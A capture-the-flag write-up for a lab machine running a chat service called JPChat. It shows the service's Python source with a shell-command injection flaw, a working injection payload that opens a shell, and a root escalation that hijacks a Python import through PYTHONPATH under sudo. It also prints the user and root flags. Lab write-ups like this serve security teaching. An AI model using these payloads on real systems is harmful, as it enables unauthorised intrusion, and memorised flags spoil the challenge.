```
┌──(kali㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.248.160 --ulimit 5000 -b 65535 -- -A 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.248.160:22
Open 10.10.248.160:3000

Connecting to port 3000 with nc shows a message and expects a [MESSAGE] or [REPORT]. Let’s try with [MESSAGE]: 

┌──(kali㉿kali)-[~/Downloads]
└─$ nc 10.10.248.160 3000   
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
[MESSAGE]
There are currently 0 other users logged in
[MESSAGE]: hello
[MESSAGE]: quit
[MESSAGE]: ^C
                                                                                     
┌──(kali㉿kali)-[~/Downloads]
└─$ nc 10.10.248.160 3000
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
[REPORT]
this report will be read by Mozzie-jpg
your name:
test
your report:
test
***Osint***      
As we are told that “the source code of this service can be found at our admin’s github”, we start searching for Mozzie-jpg JPGChat on the Internet

#!/usr/bin/env python3

import os

print ('Welcome to JPChat')
print ('the source code of this service can be found at our admin\'s github')

def report_form():

    print ('this report will be read by Mozzie-jpg')
    your_name = input('your name:\n')
    report_text = input('your report:\n')
    os.system("bash -c 'echo %s > /opt/jpchat/logs/report.txt'" % your_name)
    os.system("bash -c 'echo %s >> /opt/jpchat/logs/report.txt'" % report_text)

def chatting_service():

    print ('MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel')
    print ('REPORT USAGE: use [REPORT] to report someone to the admins (with proof)')
    message = input('')

    if message == '[REPORT]':
        report_form()
    if message == '[MESSAGE]':
        print ('There are currently 0 other users logged in')
        while True:
            message2 = input('[MESSAGE]: ')
            if message2 == '[REPORT]':
                report_form()

chatting_service()

Vulnerability

We immediately identify a vulnerability in the report_form() function, as the script is calling os.system() to execute a bash command where the user input is passed without being sanitized.

Let’s check if we can inject code. The expected string passed to os.system() is as follows:

echo 'your name'    > /opt/jpchat/logs/report.txt
echo 'your report' >> /opt/jpchat/logs/report.txt

As we know the user input is not sanitized, we could send a string that would execute the following content:

echo ''                       > /opt/jpchat/logs/report.txt
echo 'bla';/bin/bash;echo '' >> /opt/jpchat/logs/report.txt

Exploit

Use anything for the name and send bla';/bin/bash;echo ' for the report: 
┌──(kali㉿kali)-[~/Downloads]
└─$ nc 10.10.248.160 3000
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
[REPORT]
this report will be read by Mozzie-jpg
your name:
bla
your report:
bla';/bin/bash;echo '
bla
myname
id
uid=1001(wes) gid=1001(wes) groups=1001(wes)
python3 -c "import pty;pty.spawn('/bin/bash')"
wes@ubuntu-xenial:/$ 

wes@ubuntu-xenial:/$ pwd
pwd
/
wes@ubuntu-xenial:/$ cd /home
cd /home
wes@ubuntu-xenial:/home$ ls
ls
wes
wes@ubuntu-xenial:/home$ cd wes
cd wes
wes@ubuntu-xenial:~$ ls
ls
user.txt
wes@ubuntu-xenial:~$ cat user.txt
cat user.txt
JPC{487030410a543503cbb59ece16178318}
wes@ubuntu-xenial:~$ 


Escalate your privileges to root and read root.txt
Checking sudo privileges

Our wes user can execute /usr/bin/python3 /opt/development/test_module.py as root with sudo without password:

$ sudo -l
Matching Defaults entries for wes on ubuntu-xenial:
    mail_badpass, env_keep+=PYTHONPATH

User wes may run the following commands on ubuntu-xenial:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py

The sciprt is in read-only mode:

$ ls -l /opt/development/test_module.py
-rw-r--r-- 1 root root 93 Jan 15 18:58 /opt/development/test_module.py

Here is the code:

$ cat /opt/development/test_module.py
#!/usr/bin/env python3

from compare import *

print(compare.Str('hello', 'hello', 'hello'))

Python library hijacking

We can hijack the import by creating our own compare module, and inject the path of this module in the PYTHONPATH environment variable:

$ cat > compare.py << EOF
> import os
> os.system('/bin/bash')
> EOF
$ chmod +x compare.py
$ export PYTHONPATH=/home/wes
$ sudo /usr/bin/python3 /opt/development/test_module.py
root@ubuntu-xenial:~# id
uid=0(root) gid=0(root) groups=0(root)

Root flag

Awesome! Now, let’s get the root flag:

root@ubuntu-xenial:~# cd /root
root@ubuntu-xenial:/root# ls -la
total 24
drwx------  3 root root 4096 Jan 15 18:58 .
drwxr-xr-x 25 root root 4096 Apr 30 05:28 ..
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root  305 Jan 15 18:58 root.txt
drwx------  2 root root 4096 Jan 15 18:56 .ssh
root@ubuntu-xenial:/root# cat root.txt 
JPC{665b7f2e59cf44763e5a7f070b081b0a}

Also huge shoutout to Westar for the OSINT idea
i wouldn't have used it if it wasnt for him.
and also thank you to Wes and Optional for all the help while developing

You can find some of their work here:
https://github.com/WesVleuten
https://github.com/optionalCTF

Root flag: JPC{665b7f2e59cf44763e5a7f070b081b0a} 


**me**
wes@ubuntu-xenial:~$ sudo -l
sudo -l
Matching Defaults entries for wes on ubuntu-xenial:
    mail_badpass, env_keep+=PYTHONPATH

User wes may run the following commands on ubuntu-xenial:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py
wes@ubuntu-xenial:~$ cat /opt/development/test_module.py
cat /opt/development/test_module.py
#!/usr/bin/env python3

from compare import *

print(compare.Str('hello', 'hello', 'hello'))
wes@ubuntu-xenial:~$ cat > compare.py << EOF
cat > compare.py << EOF
> import os
import os
> os.system('/bin/bash')
os.system('/bin/bash')
> EOF
EOF
wes@ubuntu-xenial:~$ chmod +x compare.py
chmod +x compare.py
wes@ubuntu-xenial:~$ export PYTHONPATH=/home/wes
export PYTHONPATH=/home/wes
wes@ubuntu-xenial:~$ sudo /usr/bin/python3 /opt/development/test_module.py
sudo /usr/bin/python3 /opt/development/test_module.py
root@ubuntu-xenial:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu-xenial:~# cd /root
cd /root
root@ubuntu-xenial:/root# ls -la
ls -la
total 24
drwx------  3 root root 4096 Jan 15  2021 .
drwxr-xr-x 25 root root 4096 Aug  3 04:07 ..
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root  305 Jan 15  2021 root.txt
drwx------  2 root root 4096 Jan 15  2021 .ssh
root@ubuntu-xenial:/root# cat root.txt
cat root.txt
JPC{665b7f2e59cf44763e5a7f070b081b0a}

Also huge shoutout to Westar for the OSINT idea
i wouldn't have used it if it wasnt for him.
and also thank you to Wes and Optional for all the help while developing

You can find some of their work here:
https://github.com/WesVleuten
https://github.com/optionalCTF
root@ubuntu-xenial:/root# 

```

[[HipFlask]]